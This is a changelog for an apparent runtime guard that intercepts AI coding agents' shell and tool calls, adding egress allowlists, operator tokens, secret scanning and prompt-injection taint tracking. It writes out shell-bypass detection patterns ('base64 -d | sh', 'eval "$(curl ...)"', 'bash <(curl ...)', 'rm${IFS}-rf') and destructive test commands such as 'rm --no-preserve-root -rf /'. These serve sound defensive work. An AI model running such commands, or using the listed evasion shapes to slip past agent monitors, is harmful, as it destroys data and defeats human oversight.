- **Phase 0 / Task 0.12 — p99 regression guard.** Broader perf bench under `tests/perf/` (120 representative decision flows × 200 iter = 24K samples; spec'd 1000 iter is available via `LILARA_PERF_ITER=1000`). Asserts global p99 ≤ platform ceiling (10ms Linux / 500ms Windows-slowfs / 200ms macOS), reports per-tool p99, persists a baseline at `artifacts/perf/baseline.json` keyed by platform + node major, and applies the same 1.5× regression rule the existing `bench-runtime-decision.sh` uses. New CI step "Perf regression guard (Task 0.12, 120 flows × 200 iter)" with cache-restore for baseline. Local p99 = 2.7ms; suite elapsed ~35s on Linux. Wall-clock suite budget is platform-scaled (300s Linux/macOS, 900s Windows-slowfs) to absorb the ~5× IO multiplier observed on Windows runners; override via `LILARA_PERF_SUITE_BUDGET_S`. Coexists with the existing `bench-runtime-decision.sh` (10-input hot-path bench); the new suite is broader to catch regressions in less-hot code paths (intent classifier, posture overrides, payload-class branches, edge-input handling). Scripts count: 72→73.

### Changed

- **D26 follow-up: F4/F6/F7 fixture context isolation + ADR-001 D + ADR-002 B.** Three test scripts (`run-fixtures.sh`, `check-runtime-core.sh`, `check-runtime-cli.sh`) had assertions written before D26 floors and were silently relying on CWD-derived context discovery (protected branch, accumulated session risk, trajectory-nudge). Fixture coverage now stands at **247 fixtures** with explicit context isolation. ADR-001 Option D: F7 (intent-unknown-strict) changed from `block` to `require-review` so descriptive commands prompt for operator approval instead of being killed. ADR-002 Option B: F4 (secret-class-C) blocks by default but is demotable to `require-review` via a one-shot scoped operator token (`class-c-review-demote`) for legitimate inspection use cases (incident response, customer-data audit). Trajectory-nudge logic now applies only when source is `risk-engine`, leaving floor-derived decisions (intent-unknown-strict, taint-floor, f4-class-c-demoted, etc.) at the explicit severity their floor encodes. New `consumeScopedOperatorToken(token, scope)` in `runtime/contract.js`; `lilara-cli.sh operator-token mint --scope <scope>` flag.

### Breaking Changes

- **B3 — `contract.accept()` now requires a positive operator signal.** The previous env-var allowlist (checking absence of `CLAUDE_CODE_ENTRYPOINT`, `OPENCODE_SESSION_ID`, etc.) has been replaced with: (a) `stdin.isTTY` is true, OR (b) `LILARA_OPERATOR_TOKEN` is a valid unconsumed one-shot token. Any non-TTY automation that called `accept()` without a token will now fail with a clear error. Migration: run `lilara-cli.sh operator-token mint <label>` in an interactive shell, then pass the printed token via `LILARA_OPERATOR_TOKEN`. See `CONTRACT.md` § Operator Token Flow and D32 in `DECISIONS.md`.

### Added
- **F18 — network egress control (Task 0.4 / ADR-005)** (NEW `runtime/network-egress.js`, `runtime/decision-engine.js`, `runtime/contract.js`, `schemas/lilara.contract.schema.json`): per-contract domain allowlist for outbound network calls. Default-deny when `scopes.network.allowDomains` is present; backwards-compat when absent (additive opt-in, zero schema break — version stays at 1/2/3). Leading-dot wildcards only (`*.github.com` matches subdomains but NOT the bare apex `github.com`). IP literals blocked unconditionally except for loopback (`127.0.0.0/8`, `::1`, `localhost`). `denyDomains` overrides `allowDomains`. F18 fires inside `decide()` via `buildEarlyBlock("network-egress-denied", ...)` with `floorFired="network-egress"`, `decisionSource="network-egress-denied"` — wires through all 6 adapters (claude, opencode, openclaw, codex, clawcode, antegravity) automatically via the shared `pretool-gate → decide()` spine. New `getNetworkPolicy(contract)` accessor in `runtime/contract.js`. New `network-egress.js` exports `extractTargets`, `hostMatches`, `validatePattern`, `evaluate`, `isIpLiteral`, `isLoopback`. Reserved fields `network.dnsCacheSeconds` and `network.allowOnLookupFailure` added for future envelope-bound DNS resolution (ADR-005 §"DNS resolution timing"). URL extraction covers `http(s)`, `ftp(s)`, `ws(s)`, `ssh`, `git`, `sftp`, `gopher`, `telnet`, `ldap(s)` schemes plus a heuristic for bare-host curl/wget args. Acceptance: 21 inline F18 fixtures (allow exact, deny non-listed, wildcard subdomain match, wildcard apex not implied, deny precedence, IPv4 literal, IPv6 literal, loopback v4/v6, localhost hostname, port allowed, port on denied host, redirect-flag visible-URL policy, DoH IP literal blocked, DoH allowed via domain, multi-target fail-closed, bare-host curl detection, no-network-target passes, no-policy no-fire backwards-compat, pattern validation, decide() integration). Cross-adapter smoke test confirms all 6 adapters block. Zero new dependencies (built-ins `url`, `net`). p99 bench: 4.941ms warm (well within 5ms ceiling and 10ms F18 acceptance target). New contracts generated via `generate()` ship with `network.allowDomains: []` (default-deny). Provenance entries (ADR-006) and Web-fetch pack (Task 0.11) will piggy-back on F18.
- **F15 — execution envelope (Task 0.1)** (`runtime/envelope.js`, `runtime/decision-engine.js`, `runtime/pretool-gate.js`, `runtime/post-adapter-factory.js`, Claude hook adapters): adds byte-stable F15 execution envelopes with `build()`/`verify()` covering cwd inode, git HEAD, normalized command AST, env diff vs baseline, resolved executable path, and tracked target metadata. Decision output now carries additive `envelope` / `envelopeVerification` fields. `decision-engine.js` fails closed with `decisionSource="execution-envelope-diverged"`, `floorFired="execution-envelope"` when adapter-reported execution drifts from the approved envelope. Critical writes (payload-class-C and protected-branch writes) are re-checked immediately before execution. Claude adapter path is wired end-to-end in this run; other harnesses remain explicit `envelopeReporting: false` stubs pending manifest work (Task 0.6). Acceptance: 8 inline F15 fixtures (symlink swap, branch change, cwd change, PATH shadow, file replacement, generated script mutation, MCP tool reconfig, shell alias change) plus runtime-core stability/divergence checks. Zero new dependencies.
- **B2 Phase 2 — v3 schema + migration summary (closes G7 → COVERED):** Adds `scopes.mcp`, `scopes.skills`, `scopes.session.maxDurationMin`, `scopes.budget`. F12 (mcp-deny) + F13 (skill-deny) + F14 (budget-exceeded) hard floors layered after F11. F14b (session-over-duration) escalates to `require-review` after operator-declared time limit (D47, same pattern as F10 taint-floor). New `runtime/session-budget.js` for per-session counters (atomic writes, mode 0600). v2→v3 migration script writes to `lilara.contract.json.draft` (lossless, idempotent, never overwrites live file); new `check-migrate-v2-v3.sh` CI gate. Schema additive: v1 + v2 contracts validate identically; hash byte-stable for unchanged contracts. NEW `lilara.contract.v3.json.example`. CONTRACT.md gains five v3 sections. G7 PARTIAL → COVERED in AMPLIFICATION_PLAN, ENHANCEMENT_PLAN, and OWASP matrix. 13 new inline fixtures (6+3+2+1+1). Bench p99 cumulative vs Run 4 baseline 54.6ms: +1.4ms.
- **B2 Phase 2 / commit 3 — v2→v3 migration** (NEW `scripts/migrateV2ToV3.js`, NEW `scripts/check-migrate-v2-v3.sh`, NEW `lilara.contract.v3.json.example`): zero-dep Node migration tool reads lilara.contract.json, validates as v1/v2, sets version=3, recomputes contractHash, writes to lilara.contract.json.draft (never overwrites the live file; refuses to overwrite an existing draft). Idempotent: v3 input → exit 0 + stderr "already version 3" message, no draft written (alembic/knex convention). Lossless: all v2 fields byte-equal in draft. New CI gate runs the migration end-to-end against a synthetic v2 fixture (schema-valid, hash-correct, lossless, idempotent). Registered in check.yml. 2 inline fixtures (`migrate:v2-to-v3-lossless`, `migrate:v3-idempotent-noop`). NEW `lilara.contract.v3.json.example` with all four v3 field families populated; correct contractHash.
- **B2 Phase 2 / commit 2 — scopes.session + scopes.budget (F14)** (`schemas/lilara.contract.schema.json`, `runtime/contract.js`, `runtime/decision-engine.js`, NEW `runtime/session-budget.js`): `scopes.session.maxDurationMin` forces `action="require-review"` + `source="session-over-duration"` when session age exceeds the limit (D47 — same pattern as F10 taint-floor; operator declared "after N minutes, stop and ask me"); `sessionDurationWarning` annotation also attached to result and journal. `scopes.budget.maxDestructiveOps` + `maxExternalBytes` are hard floors — F14 `buildEarlyBlock` when either counter at decide-time equals or exceeds its limit. NEW `runtime/session-budget.js` mirrors `session-context.js` atomic-write (tmp+renameSync, mode 0600) pattern; per-session-id partitioning under `~/.lilara/session-budget/`. `recordDestructiveOp` wired after decide returns `allow` for `destructive-delete` class. `getSessionConstraints` + `getBudgetLimits` added to `contract.js` and exported. F14b session-over-duration asserted AFTER all demotion blocks so contract-allow/auto-allow-once/trajectory-nudge cannot silently undo it. 3 inline fixtures (`budget:destructive-block`, `budget:bytes-block`, `session:over-duration-require-review`). Bench p99: 55.7ms (D31 baseline 61.2ms, cap 91.8ms).
- **B2 Phase 1 — v2 contract wire-up summary** (closes G7 PARTIAL): All four v2 schema field families that previously silently no-op'd are now consumed end-to-end by `decide()`: (1) validity.activeHoursUtc + validity.activeDays (F11 floor), (2) contextTrust (per-branch posture override), (3) scopes.tools.perToolAllow (per-tool source distinction). Schema unchanged. Hash-stable. v1 contracts unaffected. Bench p99 cumulative delta: <1ms across 3 wires (D31 baseline 63.0ms). 10 inline fixtures added (3 per wire + 1 integration). NEW `lilara.contract.v2.json.example` (version: 2, all four v2 field families). v3 additions (scopes.mcp/skills/session/budget) and v2→v3 migration are Phase 2.
- **B2 Phase 1 / commit 3 — scopes.tools.perToolAllow per-tool allowlist** (`runtime/contract.js`, `runtime/decision-engine.js`): `scopeMatch` now checks `scopes.tools.perToolAllow[]` before class-specific gates. Each entry matches by `tool` name; `commandGlobs` and `pathGlobs` are optional (omitted = unconstrained). On match returns `reason: "tool-allow-tool-scope"`; `decide()` maps this to `source: "contract-allow-tool-scope"` and extends the W11 escalate-demotion carve-out to it. Additive allowlist semantics. 3 inline fixtures (`tool-scope:bash-allow`, `tool-scope:bash-deny`, `tool-scope:per-tool-overrides-general`).
- **B2 Phase 1 / commit 2 — contextTrust per-branch posture override** (`runtime/contract.js`, `runtime/decision-engine.js`): `getContextTrust(contract, branch)` returns the first matching `branchPattern` entry's `trustPosture` (first-match-wins per schema; authors order entries by specificity). `decide()` overrides `enriched.trustPosture` before `score()` runs. Affects risk-score posture adjustment only — scopes and floors unaffected. 3 inline fixtures (`context-trust:main-strict`, `context-trust:feature-relaxed`, `context-trust:specificity`).
- **B2 Phase 1 / commit 1 — validity-window floor** (`runtime/contract.js`, `runtime/decision-engine.js`): `getValidity(contract)` + `isInActiveWindow(contract, now)` exported. New F11 floor in `decide()` — when the contract's `validity.activeHoursUtc` window or `validity.activeDays` set excludes the current UV time AND the payload class action is `"warn"` or `"block"`, action is forced to `block` with `source="validity-outside-window"`, `floorFired="validity-window"`. Non-gated payload classes outside window get a structured `validityWarning` annotation on the decision return + journal entry; action unchanged. Window crossing midnight handled (start>end). 3 inline fixtures in `run-fixtures.sh` (`validity:in-window-allow`, `validity:out-window-block`, `validity:wrong-day-of-week`). ARCHITECTURE.md F11 row added to precedence ladder.
- **B2 Phase 2 / commit 1 — scopes.mcp + scopes.skills (F12, F13)** (`schemas/lilara.contract.schema.json`, `runtime/contract.js`, `runtime/decision-engine.js`): version enum extended to [1,2,3]. New named properties `scopes.mcp` and `scopes.skills` declare per-name policy maps (`allow|warn|block`). `getMcpPolicy(contract, serverName)`, `getSkillPolicy(contract, skillName)`, `extractMcpServerName(toolName)` exported from `contract.js`. F12 (mcp-deny) and F13 (skill-deny) floors fire after risk scoring, before contract-allow. `warn` policy attaches `mcpWarning`/`skillWarning` annotation to the decision return + journal entry; action unchanged. 6 inline fixtures (`mcp:server-block`, `mcp:server-warn`, `mcp:server-allow-default`, `skill:skill-block`, `skill:skill-warn`, `skill:skill-allow-default`). Bench p99: 57.8ms (D31 baseline 61.2ms, cap 91.8ms).
- **A1 — Shell bypass detection** (`runtime/shell-bypass-detector.js`): zero-dep regex-based bypass-pattern detector (not a true shell tokenizer) that detects bypass patterns pure-regex misses — base64 decode piped to shell (`base64 -d | sh`), IFS whitespace substitution (`rm${IFS}-rf`), eval with dynamic content (`eval "$(curl ...)"`), variable-as-command splits (`r="rm"; $r -rf /`), and network process substitution (`bash <(curl ...)`). Command substitution present without a named pattern sets `isUnresolvable`, adding +5 to the risk score (fail-safe-up). Integrated into `runtime/risk-score.js`: each of the 5 bypass classes adds 5–7 to the risk score, pushing previously-missed bypass attempts to high or critical. 31 new test cases (15 bypass + 16 negative) under `tests/fixtures/shell-ast/`, all green. Fixture total: 247. Partially covers G1 (shell bypass) from ENHANCEMENT_PLAN.md — 5 documented bypass shapes covered; novel shapes escalate via `shell-ast-unresolvable`.
- **A2 — Provenance/taint tracking for indirect prompt-injection defense** (`runtime/taint.js`, `runtime/provenance-correlator.js`): `recordExternalRead(content, source)` annotates tool results from external sources (browser, MCP, web-fetch, curl/wget) to a 5-minute provenance window at `~/.lilara/provenance-window.json` (max 20 entries, mode 0600). `correlateCommand(command)` checks for overlap using exact substring match or token-level match (tokens ≥ minTokenLength chars, non-flag; minTokenLength configurable via `lilara.config.json` `taint.minTokenLength`, range 4–32, default 6). When overlap is found, `decision-engine.js` raises the action to `require-review` via the **F10 taint floor** (rung 8.5 — after protected-branch floor, before session-risk floor), setting `decisionSource = "taint-floor"`. Journal records carry `taintSource` and `taintReason` fields on tainted decisions. Taint module unavailability is logged as `kind: "taint-floor-disabled"` in the decision journal (once per process) — the floor silently disables rather than crashing, but leaves an audit trail. Provenance window written atomically (tmp + renameSync) to prevent truncated-file reads on interrupted writes. Zero external dependencies; taint errors never block a decision (try/catch). `runtime/session-context.js` gains `recordExternalRead`, `getProvenanceWindow`, and `provenanceWindowPath` exports. Acceptance: 5 inline tests in `run-fixtures.sh` (tainted→require-review, unrelated→allow, clean-window→not-taint-floor, journal-fields present, disabled-warning logged). A2 acceptance read narrowly per 2026-05-07 agreement: Claude-harness fixture only. A3 will port the PostToolUse hook to the other 5 harnesses. Partially closes G2 (indirect prompt injection) from ENHANCEMENT_PLAN.md; D37 tracks the remaining tool-class gate gap.
- **A3 — PostToolUse parity across all 6 harnesses** (closes ASI05 NOT COVERED gap from `references/owasp-agentic-coverage.md`): Five new `post-adapter.js` files (`opencode/hooks/`, `openclaw/hooks/`, `codex/hooks/`, `clawcode/hooks/`, `antegravity/hooks/`) plus updated `claude/hooks/output-sanitizer.js`. Each adapter does: (1) secret scan via `runtime/secret-scan.js` (23-pattern set, warns on credential echo); (2) external-read taint recording via `runtime/taint.js` for external-source tool outputs (WebFetch, mcp, curl, wget, Browser). All six adapters are gated by `LILARA_KILL_SWITCH=1` and `rateLimitCheck()`. `scripts/check-post-adapter-parity.sh` (new CI script) asserts all 6 adapters have both `scanSecrets()` and `recordExternalRead()` — fails loudly if any is missing. OWASP ASI05 row updated from PARTIAL/NOT COVERED to COVERED (with DOCUMENTED LIMITATION for Codex/Clawcode/Antegravity where the PostToolUse event model is unverified against live instances). Scripts count: 68→69.
- **B3 — Operator token infrastructure** (`runtime/contract.js`): `mintOperatorToken(label)`, `consumeOperatorToken(token)`, `operatorTokensPath()` — 32-byte random hex one-shot tokens persisted to `~/.lilara/operator-tokens.jsonl` (mode 0600); `_checkOperatorSignal()` enforces the positive-signal gate. `lilara-cli.sh operator-token mint [label]` and `operator-token verify <token>` sub-commands added. 6 inline acceptance-gate fixture tests in `run-fixtures.sh`. `CONTRACT.md` § Operator Token Flow documents the migration path. D32 filed in `DECISIONS.md`.
- **A4 — Journal redaction implemented** (`runtime/decision-journal.js`): when `contract.scopes.secrets.redactInJournal=true`, `append()` applies the full 23-pattern secret set (via `runtime/secret-scan.js:getPatterns()`) to `targetPath` and `notes` before writing JSONL; redaction applied before the 256-char slice so secrets straddling the boundary are caught; records carry `redactInJournal:true` metadata when active. `runtime/secret-scan.js` gains `getPatterns()` export. `runtime/decision-engine.js` wires `redact: Boolean(contract?.scopes?.secrets?.redactInJournal)` into its `append()` call. Bench p99 delta: sub-measurement-noise on win32-slowfs-v24 (56.831 ms vs 56.831 ms baseline). Acceptance: `run-fixtures.sh` jredact:redact-on / jredact:redact-off inline tests (191 invocations total).
- **A5 — Rate-limit TOCTOU fix** (`claude/hooks/hook-utils.js:rateLimitCheck`): replaced the read-modify-write sequence with an O_EXCL lockfile. Lock acquisition is atomic; contention returns false (deny, preventing over-allowance); stale locks >2 s are stolen to recover from crashed processes; FS catastrophe preserves the existing fail-open behaviour. `tests/fixtures/rate-limit/concurrent-harness.js` + `worker.js` verify 8 concurrent processes against capacity=3 (refillRate=0 for determinism): exactly 3 pass, final token=0, no over-allowance. Bench: `decide()` latency unaffected (rateLimitCheck is not in the bench hot path). DECISIONS.md D27–D30 added (A4 follow-up smells; none block Wave 1).
- `scripts/check-codex-adapter.sh`, `scripts/check-antegravity-adapter.sh` — CI adapter verification scripts for the two remaining EXPERIMENTAL harnesses
- `scripts/migrate-policy-store.sh` — one-shot migration from legacy 4-part to 5-part learned-allow keys; invoked automatically by `lilara-cli.sh upgrade`
- 30 new fixture test cases (216 fixture pairs total) across `tests/fixtures/codex/`, `tests/fixtures/clawcode/`, `tests/fixtures/antegravity/`
- `WIRING_PLAN.md`, `COMPATIBILITY_STRATEGY.md`, `APPLY_CHECKLIST.md` for codex, clawcode, antegravity
- `check-cross-harness-equivalence.sh` extended to all 6 harnesses (was 3)
- Egress Sanitization Scope section in `SECURITY_MODEL.md`

---

## [3.0.0] — 2026-04-27

> **Breaking:** All `ECC_*` environment variables renamed to `LILARA_*`. Config file `ecc.config.json` → `lilara.config.json`. Contract file `ecc.contract.json` → `lilara.contract.json`. State dir `~/.openclaw/agent-runtime-guard` → `~/.lilara`. CLI `ecc-cli.sh` → `lilara-cli.sh`. ContractId prefix `arg-` → `hap-`. See `scripts/lilara-rebrand-history.sh` for the migration script.

### Migration — existing state under `~/.openclaw/agent-runtime-guard/`

The runtime default state directory has moved. If you have an existing installation:

- **Option A (recommended):** Move your state dir — `mv ~/.openclaw/agent-runtime-guard ~/.lilara`
- **Option B (preserve old path):** Set `LILARA_STATE_DIR=$HOME/.openclaw/agent-runtime-guard` in your shell profile or `lilara.config.json` to keep using the legacy location.

The `LILARA_STATE_DIR` environment variable overrides the default in all runtime modules (`policy-store.js`, `contract.js`, `decision-journal.js`, `session-context.js`) and is already used by all CI/test scripts for isolation.

### Phase 1 — Foundation: rebrand + close structural weaknesses

#### Added
- `MASTER_PLAN.md`: Strategic architecture document (20 sections). Pass-1 sections fully authored: Vision, Product Identity, Research Findings (top 5 capability areas), Rebranding Specification, Architecture Overview, Phase Plan, Language Policy, Risk Assessment, Non-Goals, Decision Log, Execution Flow, Security Contract UX.
- `references/v2-rewrite-plan-rev3.md`: Canonical W1–W14 weakness status reconstruction. 11 fully fixed, 3 closed by this release (W8, W11, W14).
- `scripts/lilara-rebrand-history.sh`: One-time rename script (ECC_ → LILARA_, ecc.* → horus.*). Supports `--dry-run` (default) and `--apply` modes.

#### Fixed (W11 — High-risk non-destructive pre-approval)
- `runtime/contract.js` (`scopeMatch`): Added `scopes.shell.toolAllow` prefix-matching before the class-specific remote-exec/auto-download/global-install gates. Commands listed in `toolAllow` (e.g. `"npx -y"`, `"curl | bash"`, `"npm install -g"`) return `reason: "tool-allow-matched"`.
- `runtime/decision-engine.js` (Step 11): `canDemoteEscalate` flag — `escalate → allow` demotion is now permitted when `contractReason === "tool-allow-matched"`. All other hard floors (block, require-review, critical) are unchanged.
- `scripts/run-fixtures.sh`: 6 new inline assertions for toolAllow pre-approval. Fixture count 180 → 183.

#### Fixed (W14 — Docs/reality drift)
- `ARCHITECTURE.md`: Added `index.js`, `intent-classifier.js`, `route-resolver.js` to the Runtime Module Map (count 20 → 23).
- `MODULES.md`: Added `intent-classifier.js` and `route-resolver.js` to the Runtime Autonomy Layer table.
- `DECISIONS.md` (D5): Updated from stale "hooks do not enforce" to accurate two-mode description (warn default / exit 2 enforce).

#### Changed (W8 — state-paths.js unified + brand rename)
- `runtime/state-paths.js`: `stateDir()` default → `~/.lilara`. `hookStateDir()` legacy `.openclaw/ecc-safe-plus` default → `~/.lilara`. `instinctDir()` default → `~/.lilara/instincts`. Override via `LILARA_STATE_DIR`.
- All 95 files touched by the rename: `ECC_*` → `LILARA_*`, `ecc.*` → `horus.*`, `arg-` contractId prefix → `hap-`.
- `runtime/contract.js`: `newContractId()` generates `hap-YYYYMMDD-hex` (was `arg-`). `acceptedContractsPath()` reads `LILARA_STATE_DIR`.
- `schemas/lilara.contract.schema.json`: contractId pattern `^arg-` → `^hap-`.
- File renames: `schemas/ecc.config.schema.json` → `schemas/lilara.config.schema.json`, `schemas/ecc.contract.schema.json` → `schemas/lilara.contract.schema.json`, `scripts/ecc-cli.sh` → `scripts/lilara-cli.sh`, `scripts/ecc-diff-decisions.sh` → `scripts/lilara-diff-decisions.sh`, `ecc.config.json.example` → `lilara.config.json.example`, `ecc.contract.json.example` → `lilara.contract.json.example`.

Fixture count after Phase 1: **183 fixture-based tests**.

---

### Phase 3 — Autonomous routing foundation

#### Added
- `runtime/intent-classifier.js`: Pure pattern-based classifier mapping shell commands to one of eight intents (`explore`, `build`, `deploy`, `modify`, `configure`, `cleanup`, `debug`, `unknown`). Returns `{ intent, confidence, indicators }`. Zero external dependencies.
- `runtime/route-resolver.js`: Static routing table mapping classified intents to workflow lanes (`direct`, `verification`, `review`) plus an optional target script. Supports per-project overrides via `context.routingTable`. Exports `resolveRoute`, `DEFAULT_ROUTING_TABLE`, `KNOWN_INTENTS`.
- `runtime/decision-engine.js`: `decide()` now calls `classifyIntent(input.command)` and exposes `intent` in the return object, the explanation string, and the decision journal entry.
- `runtime/index.js`: Exports `classifyIntent`, `resolveRoute`, `DEFAULT_ROUTING_TABLE`, `KNOWN_INTENTS`.
- `scripts/lilara-cli.sh runtime classify <command>`: CLI subcommand that classifies a shell command and prints `{ intent, confidence, indicators }` as JSON.
- `scripts/lilara-cli.sh runtime route <command>`: CLI subcommand that classifies then routes a command, printing combined classification + route JSON.
- `scripts/run-fixtures.sh`: 18 new inline assertions — 12 intent-classifier unit tests + 6 route-resolver unit tests. Executed test count: 158 → 180.

---

### Phase 1 — Context isolation + fixture correctness

#### Added
- `tests/fixtures/dangerous-command-gate/dcg-enforce-npx-y-feature-branch.*`: Companion fixture — `npx -y` on a non-protected feature branch with LILARA_ENFORCE=1 routes (exit 0). Covers the medium-risk warn path.
- `tests/fixtures/dangerous-command-gate/dcg-enforce-hard-reset-feature-branch.*`: Companion fixture — `git reset --hard` on a non-protected feature branch with LILARA_ENFORCE=1 routes (exit 0).
- `tests/fixtures/opencode/opencode-enforce-npx-y-feature-branch.*`: Same coverage for OpenCode adapter.
- `tests/fixtures/opencode/opencode-enforce-hard-reset-feature-branch.*`: Same coverage for OpenCode adapter.

#### Fixed
- `runtime/pretool-gate.js`: `discover()` call now forwards `rawInput.branch` so fixture inputs (and real hook payloads) can supply a branch override, bypassing live git detection. Prevents protected-branch context from contaminating fixtures run from the `master` working tree.
- `tests/fixtures/dangerous-command-gate/dcg-enforce-npx-y.*` and `dcg-enforce-hard-reset.*`: Corrected `expected_exit` 0 → 2 and `expected_stderr` → `BLOCKED`. These fixtures run without a branch override, so context-discovery detects `master` (protected), pushing the risk score from medium to critical — the runtime correctly blocks them.
- `tests/fixtures/opencode/opencode-enforce-npx-y.*` and `opencode-enforce-hard-reset.*`: Same correction as above for the OpenCode adapter path.

Fixture count after Phase 1: **183 fixture-based tests** (179 → 183; +4 companion fixtures).

---

### Pre-release hardening: cross-harness parity + output sanitization

#### Added
- `claude/hooks/output-sanitizer.js`: PostToolUse hook scans tool output for 23 secret patterns. Warns when a credential is echoed by a tool; cannot block (PostToolUse is informational). Extends the same `runtime/secret-scan.js` patterns used by the PreToolUse spine.
- `runtime/pretool-gate.js`: Cross-harness secret-scan parity — `scanSecrets()` is now called for every harness (claude, opencode, openclaw), not just via the Claude-specific `secret-warning.js` hook. Secrets upgrade `payloadClass` to C, triggering the hard floor in `decide()` identically across all harnesses.
- `tests/fixtures/cross-harness/ch-secret-api-key.input`: New fixture verifying `sk-proj-*` bearer token detection via the cross-harness path.
- `tests/fixtures/dangerous-command-gate/dcg-enforce-hard-reset.{input,expected_exit,expected_stderr}`: Enforce-mode fixture for `git reset --hard` — confirms medium-risk (route) command warns but does NOT block in enforce mode (exit 0). Closes gap in claude enforce coverage.
- `tests/fixtures/dangerous-command-gate/dcg-enforce-npx-y.{input,expected_exit,expected_stderr}`: Enforce-mode fixture for `npx -y` — confirms medium-risk command warns but does not block (exit 0).
- `tests/fixtures/dangerous-command-gate/dcg-enforce-rm-no-preserve-root.{input,expected_exit,expected_stderr}`: Enforce-mode fixture for `rm --no-preserve-root -rf /` — confirms critical-risk command blocks (exit 2).
- `tests/fixtures/kill-switch/ks-output-sanitizer.input`: Kill-switch fixture for output-sanitizer (exit 0, passthrough informational hook).

#### Fixed
- `tests/fixtures/opencode/opencode-enforce-hard-reset` and `oc-enforce-hard-reset`: Wrong expected_exit (was 2, corrected to 0). `git reset --hard` scores medium risk (5) → route → enforcementAction=warn → exit 0 in enforce mode.
- `tests/fixtures/opencode/opencode-enforce-npx-y` and `oc-enforce-npx-y`: Wrong expected_exit (was 2, corrected to 0). `npx -y` scores medium risk (5) → route → exit 0 in enforce mode.

#### Changed
- `runtime/risk-score.js`: Protected-branch matching now uses `globMatch()` from `runtime/glob-match.js` instead of `.includes()`. Glob patterns like `release/*` in `branches.protected` now correctly match `release/1.2` and similar branch names.
- `scripts/check-counts.sh`: `EXPECTED_HOOKS` 12 → 13; `EXPECTED_FIXTURES` 175 → 179.
- `scripts/check-kill-switch.sh`: Added output-sanitizer.js as a passthrough hook (exit 0); count updated 12 → 13.
- `scripts/run-fixtures.sh`: Added output-sanitizer kill-switch fixture run.
- `scripts/hooks-baseline.sha256`: Added output-sanitizer.js entry.
- `README.md`: Hook count 12 → 13; fixture count 174 → 179; added output-sanitizer.js to hook table.
- `references/full-power-status.md`: Fixture count updated 174 → 179 (179/179 passing).

Fixture count after this batch: **179 fixture-based tests**.

### Contract schema v2 evolution

#### Added

- `schemas/lilara.contract.schema.json`: `version` enum expanded to `[1, 2]`. Three new optional top-level fields (v2 only):
  - `validity` — UTC time-window (`activeHoursUtc: {start, end}`) and `activeDays` array. Controls when `contract-allow` demotions are honoured; engine floors always apply.
  - `contextTrust` — ordered array of `{branchPattern, trustPosture}` entries for per-branch trust posture overrides. First match wins; falls back to top-level `trustPosture`.
  - `scopes.tools` — `perToolAllow` array of `{tool, commandGlobs?, pathGlobs?}` entries for finer-grained per-tool allowlists beyond the shell scope.
  All v1 contracts continue to validate without change (new fields are optional).
- `scripts/migrateV1ToV2.js`: In-place upgrade script. Reads a v1 contract, bumps `version` to 2 and `revision` by 1, updates `acceptedAt`, recomputes `contractHash` via `canonical-json.js`, validates against the updated schema, writes the result. Supports `--dry-run` and `--input`/`--output` flags.
- `scripts/check-migrate-v1-v2.sh`: CI check verifying round-trip migration correctness: creates a v1 fixture, runs migration, validates version/revision/hash, confirms idempotency (v2 → v2 is a no-op).
- `.github/workflows/check.yml`: Added "Contract schema v2 migration" CI step.

#### Changed

- `scripts/check-counts.sh`: `EXPECTED_SCRIPTS` 61 → 63.
- `README.md`: Scripts section count updated; `migrateV1ToV2.js` and `check-migrate-v1-v2.sh` added to script table.

---

### Scope-defined contract CI gate

#### Added

- `scripts/check-decision-replay.sh`: CI gate that replays the shipped sample journal through the current decision engine and exits 1 on any action divergence. Catches regressions in risk scoring, decision routing, or policy logic.
- `artifacts/journal/sample-journal.jsonl`: 12 representative JSONL entries (allow, route, modify, require-tests, escalate, block across low/medium/high/critical risk) generated with `LILARA_TRAJECTORY_WINDOW_MIN=0` and per-entry fresh state for deterministic replay.
- `.github/workflows/check.yml`: Added "Decision replay (sample journal CI gate)" step between cross-harness and contract checks.

#### Changed

- `scripts/check-counts.sh`: `EXPECTED_SCRIPTS` 60 → 61 (sh+js count).
- `README.md`: Scripts section count 61 → 62 (total file count, including `hooks-baseline.sha256`); added `check-decision-replay.sh` to script table.

---

### Legacy 4-part learned-allow key removal

#### Changed

- `runtime/policy-store.js`: Removed the legacy 4-part key read fallback from `isLearnedAllowed()`, `getApprovalCount()`, `recordApproval()`, `getSuggestionForInput()`, and `getPolicyFacts()`. These functions now read exclusively from the 5-part `fineKey` (project-scoped, shipped as the write path in v2.0.1). The one-release back-compat window has closed. Old learned-allow decisions stored under the legacy 4-part key are no longer honoured; operators who need to migrate can re-record approvals.

---

### Correctness hardening batch (H1–H3 + doc sync)

#### Fixed

- **H1 — Hermetic fixture state** (`scripts/run-fixtures.sh`): Added suite-level `LILARA_STATE_DIR=$(mktemp -d)` + cleanup trap, plus per-fixture `LILARA_STATE_DIR` on each `node` invocation. Previously, trajectory state (`recentEscalations`, `sessionRisk`) accumulated across fixture invocations in `~/.lilara/session-context.json`. Once ≥3 escalations built up from earlier fixtures, the trajectory-nudge in `runtime/decision-engine.js:235-239` promoted medium-risk commands to `require-review` → `enforcementAction="block"` → exit 2, causing `dcg-enforce-hard-reset`, `dcg-enforce-npx-y`, and their opencode/oc variants to fail. Fixture count: 158 pass, 0 fail.
- **H1 — enforce-action gap** (`runtime/decision-engine.js:283`): Added `require-tests` to the `enforcementAction` blocking set (`["block","escalate","require-review","require-tests"]`). High-risk destructive-delete commands (score 7, `require-tests` action) now block (exit 2) under LILARA_ENFORCE=1 rather than silently warning. Previously these were relying on accumulated session-risk state to trigger the block — correct behavior, wrong mechanism.
- **H2 — bench platform detection** (`scripts/bench-runtime-decision.sh`): Broadened Windows detection from `grep -qi mingw` to also match `OS=Windows_NT`, MinGW/MSYS/Cygwin, and WSL-on-`/mnt/`. Added `slow_fs` flag passed as argv[5] to Node. Node side now keys the baseline by `platformKey` (`win32-slowfs` on slow-FS environments, raw `process.platform` elsewhere) instead of `process.platform` alone. Added 3× sanity guard: if current p50 is >3× the recorded baseline, the overwrite is skipped (indicates wrong FS context).
- **H2 — bench baseline reset** (`artifacts/bench/baseline.json`): Prior `"linux"` entry contained Windows-magnitude p50=36.892ms / p99=178.876ms — physically inconsistent with real Linux (documented p50<1ms, p99<5ms). The entry was written during a WSL-on-`/mnt/c` session where `process.platform === "linux"` but FS IO was Windows-class; the bash-side `mingw`-only detection fell through to the 5ms Linux ceiling, producing the reported failure `p99 236.673ms exceeds cap 5.000ms`. File reset to `{}` and regenerated with correct `win32-slowfs` key.
